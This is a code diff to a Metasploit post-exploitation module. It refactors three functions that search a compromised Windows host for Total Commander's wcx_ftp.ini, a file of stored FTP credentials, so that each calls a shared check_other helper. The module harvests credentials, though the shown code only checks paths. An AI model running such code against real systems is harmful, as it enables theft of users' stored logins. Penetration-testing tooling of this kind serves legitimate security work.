@@ -103,33 +103,17 @@ class Metasploit3 < Msf::Post
 
 	def check_userdir(path)
 		filename = "#{path}wcx_ftp.ini"
-		if file?(filename)
-			print_status("Found File at #{filename}")
-			get_ini(filename)
-		else
-			print_status("#{filename} not found ....")
-		end
-
+		check_other(filename)
 	end
 
 	def check_appdata(path)
 		filename = "#{path}\\GHISLER\\wcx_ftp.ini"
-		if file?(filename)
-			print_status("Found File at #{filename}")
-			get_ini(filename)
-		else
-			print_status("#{filename} not found ....")
-		end
+		check_other(filename)
 	end
 
 	def check_systemroot
 		winpath = expand_path("%SYSTEMROOT%")+'\\wcx_ftp.ini'
-		if file?(winpath)
-			print_status("Found File at #{winpath}")
-			get_ini(winpath)
-		else
-			print_status("#{winpath} not found ....")
-		end
+		check_other(winpath)
 	end
 
 	def check_other(filename)
